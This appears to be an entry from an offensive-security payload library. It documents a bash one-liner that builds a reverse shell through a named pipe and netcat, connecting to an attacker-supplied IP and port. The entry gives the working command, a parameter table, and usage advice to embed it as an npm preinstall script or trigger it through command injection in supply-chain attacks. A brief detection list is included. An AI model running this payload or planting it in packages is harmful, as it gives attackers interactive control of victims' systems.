---
id: c76e17a9-0541-4d6e-825a-474b99e0fbdb
type: code
name: bash-netcat-reverse-shell-via-fifo
language: Bash
verified: true
created_at: '2019-10-09T22:21:56.346567+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - payload
  - netcat
validated: true
---

# bash-netcat-reverse-shell-via-fifo

## Code

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```

## Description

This bash one-liner creates a reverse shell using a FIFO (named pipe) in /tmp to handle input/output between a spawned /bin/sh and netcat. It connects back to an attacker-controlled host, providing an interactive shell without requiring additional tools beyond netcat and bash on the target.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's listening host | 10.10.10.10 |
| $_ATTACKER_PORT | Port on which the attacker is listening (e.g., with nc -lvnp) | 443 |

## Usage

Embed this code as a preinstall script in an npm package.json or execute directly via command injection. Start a listener on the attacker side with `nc -lvnp $PORT` before triggering the payload. Ideal for Linux targets in supply chain or initial access scenarios.

## Detection

- Monitor for netcat processes (nc) or unexpected outbound connections to high ports.
- Check /tmp for FIFO files (mkfifo) with `ls -l /tmp | grep p`.
- Audit bash history or process trees for rm/mkfifo/cat/nc chains.
- Network logs showing shell-like traffic over non-standard ports.

## Related

- [[procedures/Create-Malicious-NodeJS-NPM-Package]]
- [[tools/Netcat]]
